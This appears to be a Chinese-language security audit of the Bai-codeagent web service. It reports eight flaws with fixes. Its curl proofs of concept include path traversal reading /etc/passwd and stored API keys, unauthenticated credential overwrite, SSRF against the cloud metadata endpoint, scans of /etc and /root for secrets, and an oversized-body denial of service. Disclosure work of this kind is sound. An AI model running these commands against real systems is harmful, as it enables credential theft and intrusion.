# 安全漏洞报告 — Bai-codeagent

**审计日期：** 2026-05-17  
**审计者：** 自动化安全审计 + 手工验证  
**影响版本：** v1.0.0 (当前 main 分支)  
**严重程度分布：** CRITICAL x3, HIGH x3, MEDIUM x2

---

## 漏洞总览

| # | 严重程度 | 漏洞类型 | 影响文件 | CVSS 估计 |
|---|----------|----------|----------|-----------|
| 1 | **CRITICAL** | 路径遍历 - 任意文件读取 | `server.js` (L139-140) | 9.1 |
| 2 | **CRITICAL** | 敏感凭据明文存储 + 泄露 | `settingsStore.js` + 路径遍历 | 9.0 |
| 3 | **CRITICAL** | 全 API 零认证 | `server.js` (全部路由) | 8.6 |
| 4 | **HIGH** | SSRF - 服务端请求伪造 | `server.js` L281 + `llmReviewService.js` | 8.2 |
| 5 | **HIGH** | 任意目录读取 (Local Repo Import) | `localRepoScoutAgent.js` | 7.5 |
| 6 | **HIGH** | 未鉴权的凭据覆写 | `server.js` POST /api/settings | 7.3 |
| 7 | **MEDIUM** | 无请求体大小限制 (DoS) | `server.js` readJson() | 6.5 |
| 8 | **MEDIUM** | 信息泄露 - 环境报告 | `environmentReport.js` | 5.3 |

---

## 漏洞详情

---

### VULN-01: 路径遍历导致任意文件读取 [CRITICAL]

**位置：** `server.js` 第 139-145 行

```javascript
if (req.method === "GET" && url.pathname.startsWith("/downloads/")) {
  return serveFile(res, path.join(downloadsDir, decodeURIComponent(url.pathname.replace("/downloads/", ""))));
}

if (req.method === "GET" && url.pathname.startsWith("/reports/")) {
  return serveFile(res, path.join(reportsDir, decodeURIComponent(url.pathname.replace("/reports/", ""))));
}
```

**根因：** 服务端对 URL 路径进行 `decodeURIComponent` 解码后直接拼接到文件系统路径中，没有校验解码后的路径是否包含 `../` 等遍历序列，也没有验证最终路径是否仍在预期目录内。

**PoC：**

```bash
# 读取系统 /etc/passwd
curl "http://localhost:3000/downloads/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"

# 读取应用源码
curl "http://localhost:3000/reports/..%2F..%2Fserver.js"

# 读取明文存储的 API 密钥
curl "http://localhost:3000/downloads/..%2F..%2Fworkspace%2Fsettings%2Fapp-settings.json"
```

**实际验证结果：**
```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
```

**影响：**
- 攻击者可读取服务器上任意文件（包括 `/etc/passwd`、源码、配置文件）
- 可直接读取明文存储的 API Key 和 GitHub Token
- 如果服务暴露在网络中，无需任何认证即可利用

**修复建议：**
```javascript
// 1. 解析后校验路径是否在预期目录内
const resolved = path.resolve(downloadsDir, decodeURIComponent(relativePath));
if (!resolved.startsWith(downloadsDir)) {
  return sendJson(res, 403, { error: "Access denied" });
}

// 2. 或使用 path.normalize 后检查是否包含 ..
const normalized = path.normalize(relativePath);
if (normalized.includes('..')) {
  return sendJson(res, 400, { error: "Invalid path" });
}
```

---

### VULN-02: 敏感凭据明文存储 + 可被路径遍历读取 [CRITICAL]

**位置：** `src/services/settingsStore.js` + `workspace/settings/app-settings.json`

**根因：** API Key、GitHub Token 等高敏感凭据以明文 JSON 直接写入磁盘。虽然 `GET /api/settings` 会对响应进行 mask 处理，但：
1. 磁盘文件本身是明文
2. 通过 VULN-01 的路径遍历可以直接读取该文件

**PoC：**
```bash
curl "http://localhost:3000/downloads/..%2F..%2Fworkspace%2Fsettings%2Fapp-settings.json"
```

**实际验证结果：**
```json
{
  "llm": {
    "apiKey": "sk-f687****[REDACTED]****3786"
  },
  "github": {
    "token": "github_pat_11CD****[REDACTED]****qru6"
  }
}
```

**影响：**
- 完整的 API 密钥和 Token 被泄露
- 攻击者可利用泄露的 GitHub Token 访问用户的 GitHub 仓库
- 攻击者可利用泄露的 LLM API Key 产生费用

**修复建议：**
- 使用加密存储或操作系统密钥管理（如 OS keychain、环境变量）
- 至少对敏感字段做 AES 加密后再落盘
- 设置文件权限为 `0600`

---

### VULN-03: 全 API 零认证 [CRITICAL]

**位置：** `server.js` 全部路由处理

**根因：** 所有 API 端点（包括设置读写、任务创建、密钥清除等）没有任何形式的认证或授权检查。任何能访问到该端口的客户端都可以执行所有操作。

**PoC：**
```bash
# 无需任何认证即可：
# 读取配置
curl http://localhost:3000/api/settings

# 覆写 API Key
curl -X POST http://localhost:3000/api/settings \
  -H "Content-Type: application/json" \
  -d '{"llm":{"apiKey":"MALICIOUS"}}'

# 创建审计任务扫描任意目录
curl -X POST http://localhost:3000/api/tasks \
  -H "Content-Type: application/json" \
  -d '{"sourceType":"local","localRepoPaths":["/etc"],"selectedSkillIds":["secret-exposure"]}'

# 清除所有密钥
curl -X POST http://localhost:3000/api/settings/clear-secrets \
  -H "Content-Type: application/json" \
  -d '{"targets":["llm","github","fofa"]}'
```

**影响：**
- 同一网络内的任何用户可以读取、修改、删除所有配置
- 可以触发对任意目录的扫描和文件读取
- 可以替换 API Key 为攻击者控制的值（中间人攻击）

**修复建议：**
- 添加基于 Token 或 Session 的认证中间件
- 至少绑定 `127.0.0.1` 并添加简单的 bearer token 验证
- 敏感操作（设置修改、密钥清除）应要求额外确认

---

### VULN-04: SSRF - 服务端请求伪造 [HIGH]

**位置：** 
- `server.js` → `testLlmConnection()` 
- `src/services/llmReviewService.js` → `requestStructuredReview()`

**根因：** 用户可通过 `POST /api/settings` 将 LLM 的 `baseUrl` 设置为任意 URL（包括内网地址、云元数据服务等），然后通过 `POST /api/settings/test` 或触发 LLM 审计来让服务器发起请求。

**PoC：**
```bash
# 1. 设置 baseUrl 为 AWS 元数据服务
curl -X POST http://localhost:3000/api/settings \
  -H "Content-Type: application/json" \
  -d '{"llm":{"baseUrl":"http://169.254.169.254/latest/meta-data","providerId":"openai"}}'

# 2. 触发服务器向该地址发起请求
curl -X POST http://localhost:3000/api/settings/test

# 服务器会向 http://169.254.169.254/latest/meta-data/models 发起 GET 请求
```

**实际验证结果：**
```json
{"ok": false, "status": "warn", "message": "fetch failed"}
```
（本沙箱环境无法访问外网，但确认了请求确实被发起）

**影响：**
- 在云环境中可能读取实例元数据（IAM 凭据等）
- 可以探测内网服务
- 可以攻击内网中无认证的服务

**修复建议：**
- 对 `baseUrl` 进行白名单校验（只允许已知的 LLM provider 域名）
- 禁止私有 IP 段（10.x, 172.16-31.x, 192.168.x, 169.254.x, 127.x）
- 或使用 DNS 解析后检查 IP 是否为内网地址

---

### VULN-05: 任意目录遍历读取 (Local Repo Import) [HIGH]

**位置：** `src/agents/localRepoScoutAgent.js` → `run()` + `ensureProjectMirror()`

**根因：** `localRepoPaths` 参数接受任意路径，无白名单或沙箱限制。攻击者可以指定系统上任意目录路径，系统会遍历该目录、复制文件到 `workspace/downloads/` 并分析其内容。

**PoC：**
```bash
# 触发对 /etc 目录的扫描
curl -X POST http://localhost:3000/api/tasks \
  -H "Content-Type: application/json" \
  -d '{"sourceType":"local","localRepoPaths":["/etc"],"selectedSkillIds":["secret-exposure"]}'

# 或扫描用户家目录
curl -X POST http://localhost:3000/api/tasks \
  -H "Content-Type: application/json" \
  -d '{"sourceType":"local","localRepoPaths":["/root","/home"],"selectedSkillIds":["secret-exposure"]}'
```

**影响：**
- 可以读取服务器上任意目录中的代码文件（受 `CODE_EXTENSIONS` 过滤但仍包括 .json, .yml, .yaml, .env 等敏感文件）
- 文件内容会被复制到 `workspace/downloads/` 目录
- 审计结果中可能包含泄露的敏感信息

**修复建议：**
- 对 `localRepoPaths` 设置白名单或限制在指定工作目录下
- 使用 `path.resolve()` 后检查是否在允许的范围内
- 添加认证后才能调用此功能

---

### VULN-06: 未鉴权的凭据覆写 [HIGH]

**位置：** `server.js` → `POST /api/settings`

**根因：** 任何人可以无需认证直接覆写 LLM API Key、GitHub Token 等敏感凭据。

**PoC：**
```bash
# 覆写为恶意 key
curl -X POST http://localhost:3000/api/settings \
  -H "Content-Type: application/json" \
  -d '{"llm":{"apiKey":"INJECTED-MALICIOUS-KEY"}}'
```

**实际验证结果：**
```
Key now: INJE***-KEY   (成功覆写)
```

**影响：**
- 攻击者可将 API Key 替换为自己控制的代理，实现中间人攻击
- 可将 baseUrl 指向恶意服务器，截获所有 LLM 请求中的审计代码
- 可清空合法凭据造成服务中断

**修复建议：**
- 添加认证机制
- 修改密钥时要求确认旧密钥
- 关键操作记录审计日志

---

### VULN-07: 无请求体大小限制 (DoS) [MEDIUM]

**位置：** `server.js` → `readJson()` 函数

```javascript
async function readJson(req) {
  const chunks = [];
  for await (const chunk of req) chunks.push(chunk);
  const raw = Buffer.concat(chunks).toString("utf8");
  return raw ? JSON.parse(raw) : {};
}
```

**根因：** `readJson` 函数会无限制地读取请求体直到流结束，没有设置最大长度。攻击者发送超大 JSON body 可耗尽内存。

**PoC：**
```bash
# 发送 10MB payload
python3 -c "print('{\"llm\":{\"apiKey\":\"' + 'A'*10000000 + '\"}}')" | \
  curl -X POST http://localhost:3000/api/settings \
  -H "Content-Type: application/json" -d @-
```

**影响：**
- 内存耗尽导致进程崩溃
- 服务不可用

**修复建议：**
```javascript
async function readJson(req, maxBytes = 1_048_576) { // 1MB limit
  const chunks = [];
  let totalBytes = 0;
  for await (const chunk of req) {
    totalBytes += chunk.length;
    if (totalBytes > maxBytes) {
      throw new Error("Request body too large");
    }
    chunks.push(chunk);
  }
  const raw = Buffer.concat(chunks).toString("utf8");
  return raw ? JSON.parse(raw) : {};
}
```

---

### VULN-08: 信息泄露 - 环境报告 [MEDIUM]

**位置：** `src/services/environmentReport.js` + `GET /api/health` + `GET /api/environment`

**根因：** 无认证的端点返回完整的服务器环境信息（hostname、内部路径、Node 版本、平台架构等）。

**PoC：**
```bash
curl http://localhost:3000/api/health
```

**返回内容包括：**
```json
{
  "runtime": {
    "node": "v24.14.0",
    "platform": "linux",
    "arch": "x64",
    "cwd": "/projects/sandbox/Bai-codeagent",
    "hostname": "ip-10-0-29-11.us-east-1.compute.internal"
  }
}
```

**影响：**
- 泄露内网主机名和 IP 信息
- 泄露运行环境细节，便于攻击者选择针对性的利用方式
- 泄露完整文件路径

**修复建议：**
- 添加认证
- 移除 hostname、内部路径等敏感字段
- 或在非 debug 模式下关闭此端点

---

## 漏洞利用链示例

**完整攻击链：无认证读取所有密钥**

```bash
# Step 1: 路径遍历读取明文密钥文件
curl "http://TARGET:3000/downloads/..%2F..%2Fworkspace%2Fsettings%2Fapp-settings.json"

# 获得: LLM API Key + GitHub Personal Access Token (完整明文)
```

一条请求即可获取所有敏感凭据。

---

## 修复优先级建议

1. **立即修复（P0）：** VULN-01 路径遍历 — 添加路径规范化检查
2. **立即修复（P0）：** VULN-03 添加认证机制 — 至少绑定 localhost + bearer token
3. **尽快修复（P1）：** VULN-02 密钥加密存储
4. **尽快修复（P1）：** VULN-04 SSRF — baseUrl 白名单
5. **尽快修复（P1）：** VULN-05 本地路径白名单
6. **计划修复（P2）：** VULN-06/07/08

---

## 总结

该项目存在多个严重安全漏洞，其中**路径遍历 (VULN-01) + 明文密钥存储 (VULN-02) + 零认证 (VULN-03)** 三者组合，使得任何能访问到该服务端口的攻击者可以一条请求读取所有密钥和系统文件。建议在修复完成前不要将此服务暴露到任何非本机网络。
